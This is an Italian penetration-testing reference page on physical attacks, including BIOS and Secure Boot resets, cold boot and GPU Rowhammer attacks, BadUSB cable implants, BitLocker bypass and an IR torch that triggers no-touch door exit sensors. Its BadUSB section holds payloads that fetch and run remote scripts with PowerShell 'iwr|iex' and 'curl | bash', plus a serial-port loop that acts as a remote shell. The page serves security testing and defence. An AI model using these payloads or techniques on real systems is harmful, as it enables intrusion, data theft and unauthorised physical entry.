# Attacchi fisici

{{#include ../banners/hacktricks-training.md}}

## Recupero della password del BIOS e sicurezza del sistema

**Il reset del BIOS** può essere eseguito in diversi modi. La maggior parte delle schede madri include una **batteria** che, se rimossa per circa **30 minuti**, ripristinerà le impostazioni del BIOS, inclusa la password. In alternativa, è possibile regolare un **jumper sulla scheda madre** per ripristinare queste impostazioni collegando pin specifici.

Nei casi in cui le modifiche hardware non siano possibili o pratiche, gli **strumenti software** offrono una soluzione. Avviando il sistema da un **Live CD/USB** con distribuzioni come **Kali Linux**, è possibile accedere a strumenti come **_killCmos_** e **_CmosPWD_**, che possono aiutare nel recupero della password del BIOS.

Quando la password del BIOS è sconosciuta, inserendola in modo errato **tre volte** verrà generalmente visualizzato un codice di errore. Questo codice può essere utilizzato su siti web come [https://bios-pw.org](https://bios-pw.org) per tentare di recuperare una password utilizzabile.

### Sicurezza UEFI

Per i sistemi moderni che utilizzano **UEFI** invece del BIOS tradizionale, è possibile utilizzare lo strumento **chipsec** per analizzare e modificare le impostazioni UEFI, inclusa la disabilitazione di **Secure Boot**. Questa operazione può essere eseguita con il seguente comando:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Analisi della RAM e Cold Boot Attacks

La RAM conserva brevemente i dati dopo l'interruzione dell'alimentazione, solitamente per **1-2 minuti**. Questa persistenza può essere estesa fino a **10 minuti** applicando sostanze fredde, come l'azoto liquido. Durante questo periodo prolungato, è possibile creare un **memory dump** usando strumenti come **dd.exe** e **volatility** per l'analisi.

---

## GPU Rowhammer contro le Page Table

I moderni attacchi GPU Rowhammer diventano molto più utili quando prendono di mira i **metadati della memoria virtuale della GPU** invece dei normali buffer. Ricerche recenti sulle **GPU NVIDIA Ampere con GDDR6** mostrano che un attaccante che esegue codice CUDA senza privilegi può creare pattern di hammering specifici per la GPU, usare il **memory massaging** per posizionare le strutture di paging in righe vulnerabili e quindi effettuare bit flip nella **last-level page table** o in una **page directory** intermedia. Una volta corrotta una singola entry di traduzione, l'attaccante può ottenere **lettura/scrittura arbitraria della memoria della GPU** e poi passare alla compromissione dell'host.<sup>[[1]](#references)[[2]](#references)</sup>

### Pattern di Exploitation

1. **Profilare le righe attaccabili** nella GDDR6 e creare pattern di hammering consapevoli del refresh / non uniformi che aggirino le mitigazioni integrate nella DRAM.
2. **Eseguire il massaging delle allocazioni della GPU** affinché il driver collochi le strutture di traduzione delle pagine in posizioni fisiche attaccabili invece di mantenerle nel pool protetto predefinito. In pratica, ciò può significare esaurire la regione a bassa memoria delle page table e sottoporre a spraying grandi mapping UVM sparsi con stride controllati.
3. **Effettuare il bit flip nei metadati di traduzione**, come **PFN** o nei bit relativi all'aperture, all'interno di una entry di page table / page directory, in modo che la pagina virtuale controllata dall'attaccante venga risolta come pagine di page table, memoria arbitraria della GPU o mapping di sistema visibili dall'host.
4. Riutilizzare il mapping contraffatto per riscrivere altre entry di traduzione ed effettuare l'escalation fino a ottenere **lettura/scrittura arbitraria della memoria della GPU** tra i contesti della GPU.

### Host Pivot e Mitigazioni

- Con **IOMMU disabilitato**, i mapping contraffatti della system aperture possono esporre alla GPU qualsiasi **memoria fisica dell'host**, trasformando la primitiva sulla GPU in una compromissione completa dell'host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** prende di mira le entry della last-level page table, mentre **GeForge** mostra che corrompere un livello della page directory può essere più semplice, perché un singolo bit flip può reindirizzare un sottoalbero di traduzione più grande. Non considerare una sola parte del paging come critica per la sicurezza.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** resta importante perché blocca il percorso diretto verso la memoria arbitraria dell'host usato da GDDRHammer/GeForge, ma **non è una mitigazione completa**. **GPUBreach** mostra un pivot di secondo stadio in cui l'attaccante corrompe buffer CPU scrivibili dalla GPU e gestiti dal driver, quindi attiva bug di memory safety nel driver NVIDIA per ottenere una primitiva di scrittura nel kernel e una **root shell** anche con IOMMU abilitato.<sup>[[3]](#references)</sup>
- **ECC a livello di sistema** è una misura pratica di hardening sulle GPU workstation/server supportate. Le GPU consumer senza ECC espongono una superficie di difesa più debole.<sup>[[4]](#references)</sup>
- Questi attacchi non sono puramente teorici: **GeForge** ha riportato **1.171** bit flip su una RTX 3060 e **202** su una RTX A6000, sufficienti per creare una catena funzionante di privilege escalation sull'host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Attacchi Direct Memory Access (DMA)

**INCEPTION** è uno strumento progettato per la **manipolazione della memoria fisica** tramite DMA, compatibile con interfacce come **FireWire** e **Thunderbolt**. Permette di bypassare le procedure di login modificando la memoria affinché accetti qualsiasi password. Tuttavia, non è efficace contro i sistemi **Windows 10**.

---

## Live CD/USB per l'accesso al sistema

La sostituzione di binari di sistema come **_sethc.exe_** o **_Utilman.exe_** con una copia di **_cmd.exe_** può fornire un prompt dei comandi con privilegi di sistema. Strumenti come **chntpw** possono essere utilizzati per modificare il file **SAM** di un'installazione Windows, consentendo di cambiare le password.

**Kon-Boot** è uno strumento che facilita l'accesso ai sistemi Windows senza conoscere la password, modificando temporaneamente il kernel Windows o l'UEFI. Ulteriori informazioni sono disponibili su [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).<sup>[[10]](#references)</sup>

---

## Gestione delle funzionalità di sicurezza di Windows

### Scorciatoie di boot e ripristino

- **Supr**: accedere alle impostazioni del BIOS.
- **F8**: entrare nella modalità Recovery.
- Premere **Shift** dopo il banner di Windows può bypassare l'autologon.

### Dispositivi BAD USB

Dispositivi come **Rubber Ducky** e **Teensyduino** fungono da piattaforme per creare dispositivi **bad USB**, in grado di eseguire payload predefiniti quando vengono collegati a un computer target.

### Volume Shadow Copy

I privilegi di amministratore consentono di creare copie di file sensibili, incluso il file **SAM**, tramite PowerShell.

## Tecniche di impianto BadUSB / HID

### Impianti Wi-Fi gestiti tramite cavo

- Gli impianti basati su ESP32-S3, come **Evil Crow Cable Wind**, sono nascosti all'interno di cavi USB-A→USB-C o USB-C↔USB-C, si enumerano esclusivamente come tastiera USB ed espongono il proprio stack C2 tramite Wi-Fi. L'operatore deve solo alimentare il cavo dall'host vittima, creare un hotspot chiamato `Evil Crow Cable Wind` con la password `123456789` e visitare [http://cable-wind.local/](http://cable-wind.local/) (o il relativo indirizzo DHCP) per accedere all'interfaccia HTTP integrata.<sup>[[8]](#references)</sup>
- L'interfaccia browser fornisce le schede *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* e *Config*. I payload memorizzati sono contrassegnati per sistema operativo, i layout della tastiera vengono cambiati al volo e le stringhe VID/PID possono essere alterate per imitare periferiche note.
- Poiché il C2 risiede all'interno del cavo, un telefono può preparare i payload, attivarne l'esecuzione e gestire le credenziali Wi-Fi senza interagire con il sistema operativo dell'host: è ideale per intrusioni fisiche di breve durata.

### Payload AutoExec consapevoli del sistema operativo

- Le regole AutoExec associano uno o più payload da eseguire immediatamente dopo l'enumerazione USB. L'impianto esegue un fingerprinting leggero del sistema operativo e seleziona lo script corrispondente.
- Flusso di lavoro di esempio:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) o `CTRL ALT T` (terminale) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Poiché l'esecuzione è automatica, la semplice sostituzione di un cavo di ricarica può consentire l'accesso iniziale “plug-and-pwn” nel contesto dell'utente che ha effettuato il login.

### Remote shell avviata tramite HID su Wi-Fi TCP

1. **Bootstrap tramite keystroke:** un payload memorizzato apre una console e incolla un loop che esegue qualsiasi contenuto arrivi sul nuovo dispositivo seriale USB. Una variante minima per Windows è:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Ponte via cavo:** l'implant mantiene aperto il canale USB CDC mentre il suo ESP32-S3 avvia un client TCP (script Python, APK Android o eseguibile desktop) verso l'operatore. Qualsiasi byte digitato nella sessione TCP viene inoltrato al loop seriale sopra descritto, consentendo l'esecuzione remota di comandi anche su host isolati dalla rete. L'output è limitato, quindi gli operatori eseguono generalmente comandi alla cieca (creazione di account, preparazione di tool aggiuntivi, ecc.).

### Superficie di aggiornamento HTTP OTA

- Lo stesso stack web espone solitamente aggiornamenti firmware non autenticati. Evil Crow Cable Wind ascolta su `/update` ed esegue il flash di qualunque binario venga caricato:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Gli operatori sul campo possono sostituire a caldo le funzionalità (ad es., il firmware flash USB Army Knife) durante l'engagement senza aprire il cavo, consentendo all'implant di passare a nuove funzionalità mentre è ancora collegato all'host target.

## Bypass della crittografia BitLocker

La crittografia BitLocker può potenzialmente essere bypassata se la **password di ripristino** viene trovata all'interno di un file di memory dump (**MEMORY.DMP**). A questo scopo possono essere utilizzati strumenti come **Elcomsoft Forensic Disk Decryptor** o **Passware Kit Forensic**.

---

## Aggiunta della recovery key tramite Social Engineering

Una nuova recovery key di BitLocker può essere aggiunta tramite tattiche di social engineering, convincendo un utente a eseguire un comando che aggiunge una nuova recovery key composta da zeri, semplificando così il processo di decrittazione.

---

## Sfruttamento degli switch di intrusione dello chassis / manutenzione per eseguire il factory reset del BIOS

Molti laptop moderni e desktop small-form-factor includono uno **switch di chassis-intrusion** monitorato dall'Embedded Controller (EC) e dal firmware BIOS/UEFI. Sebbene lo scopo principale dello switch sia generare un avviso quando un dispositivo viene aperto, alcuni vendor implementano talvolta una **scorciatoia di ripristino non documentata**, attivata quando lo switch viene commutato secondo uno schema specifico.<sup>[[5]](#references)[[6]](#references)</sup>

### Come funziona l'attacco

1. Lo switch è collegato a un **GPIO interrupt** sull'EC.
2. Il firmware in esecuzione sull'EC tiene traccia della **temporizzazione e del numero di pressioni**.
3. Quando viene riconosciuto uno schema hard-coded, l'EC richiama una routine di *mainboard-reset* che **cancella il contenuto della NVRAM/CMOS di sistema**.
4. Al boot successivo, il BIOS carica i valori predefiniti: **la password del supervisore, le chiavi Secure Boot e tutta la configurazione personalizzata vengono cancellate**.

> Una volta disabilitato Secure Boot e rimossa la password del firmware, l'attacker può semplicemente avviare qualsiasi immagine di OS esterno e ottenere accesso illimitato alle unità interne.

### Esempio reale – Laptop Framework 13

La scorciatoia di ripristino per il Framework 13 (11th/12th/13th-gen) è:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Dopo il decimo ciclo, l'EC imposta un flag che istruisce il BIOS a cancellare la NVRAM al riavvio successivo. L'intera procedura richiede ~40 s e **nient'altro che un cacciavite**.<sup>[[5]](#references)</sup>

### Procedura di Exploitation Generica

1. Accendere o sospendere-riprendere il target in modo che l'EC sia in esecuzione.
2. Rimuovere il coperchio inferiore per esporre l'interruttore di intrusione/manutenzione.
3. Riprodurre lo schema di commutazione specifico del vendor (consultare la documentazione, i forum o fare reverse engineering del firmware dell'EC).
4. Riassemblare e riavviare: le protezioni del firmware dovrebbero essere disabilitate.
5. Avviare una live USB (ad esempio Kali Linux) ed eseguire le consuete attività di post-exploitation (credential dumping, esfiltrazione dei dati, impianto di binari EFI malevoli, ecc.).

### Rilevamento e Mitigazione

* Registrare gli eventi di intrusione dello chassis nella console di gestione del sistema operativo e correlarli con reset imprevisti del BIOS.
* Utilizzare **sigilli antimanomissione** sulle viti/sui coperchi per rilevare l'apertura.
* Conservare i dispositivi in **aree fisicamente controllate**; presumere che l'accesso fisico equivalga alla compromissione completa.
* Quando disponibile, disabilitare la funzione del vendor “maintenance switch reset” o richiedere un'autorizzazione crittografica aggiuntiva per i reset della NVRAM.

---

## Iniezione IR Covert Contro i Sensori di Uscita No-Touch

### Caratteristiche del Sensore
- I sensori commerciali “wave-to-exit” abbinano un emettitore LED near-IR a un modulo ricevitore simile a quello di un telecomando TV, che segnala un livello logico alto solo dopo aver rilevato più impulsi (~4–10) della portante corretta (≈30 kHz).<sup>[[7]](#references)</sup>
- Un involucro di plastica impedisce all'emettitore e al ricevitore di guardarsi direttamente, perciò il controller presume che qualsiasi portante validata provenga da una riflessione vicina e aziona un relay che apre la serratura della porta.
- Quando il controller ritiene che sia presente un target, spesso modifica l'inviluppo della modulazione in uscita, ma il ricevitore continua ad accettare qualsiasi burst che corrisponda alla portante filtrata.

### Workflow dell'Attacco
1. **Acquisire il profilo di emissione** – collegare un analizzatore logico ai pin del controller per registrare sia le forme d'onda precedenti al rilevamento sia quelle successive al rilevamento che pilotano il LED IR interno.
2. **Riprodurre solo la forma d'onda “post-detection”** – rimuovere/ignorare l'emettitore di serie e pilotare un LED IR esterno con il pattern già attivato fin dall'inizio. Poiché al ricevitore interessano solo il numero e la frequenza degli impulsi, considera la portante spoofata come una riflessione autentica e attiva la linea del relay.
3. **Controllare la trasmissione** – trasmettere la portante in burst calibrati (ad esempio, decine di millisecondi attivi e un intervallo simile disattivo) per fornire il numero minimo di impulsi senza saturare l'AGC del ricevitore o la logica di gestione delle interferenze. Un'emissione continua desensibilizza rapidamente il sensore e impedisce l'attivazione del relay.

### Iniezione Riflessiva a Lunga Distanza
- Sostituire il LED da banco con un diodo IR ad alta potenza, un driver MOSFET e un'ottica di focalizzazione consente un'attivazione affidabile da ~6 m di distanza.
- L'attaccante non necessita di una linea di vista verso l'apertura del ricevitore; puntare il fascio verso pareti interne, scaffalature o telai delle porte visibili attraverso il vetro consente all'energia riflessa di entrare nel campo visivo di ~30° e imitare un gesto della mano a distanza ravvicinata.
- Poiché i ricevitori si aspettano solo riflessioni deboli, un fascio esterno molto più intenso può rimbalzare su più superfici e rimanere comunque al di sopra della soglia di rilevamento.

### Torcia d'Attacco Weaponised
- Integrare il driver all'interno di una torcia commerciale nasconde lo strumento in bella vista. Sostituire il LED visibile con un LED IR ad alta potenza accordato alla banda del ricevitore, aggiungere un ATtiny412 (o simile) per generare i burst a ≈30 kHz e utilizzare un MOSFET per assorbire la corrente del LED.
- Una lente zoom telescopica restringe il fascio per aumentarne portata e precisione, mentre un motore vibrante sotto il controllo dell'MCU fornisce una conferma aptica che la modulazione è attiva senza emettere luce visibile.
- Alternare diversi pattern di modulazione memorizzati (frequenze della portante e inviluppi leggermente diversi) aumenta la compatibilità tra famiglie di sensori rimarchiati, consentendo all'operatore di scandire le superfici riflettenti finché il relay scatta udibilmente e la porta si apre.

---

## Riferimenti

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)

{{#include ../banners/hacktricks-training.md}}
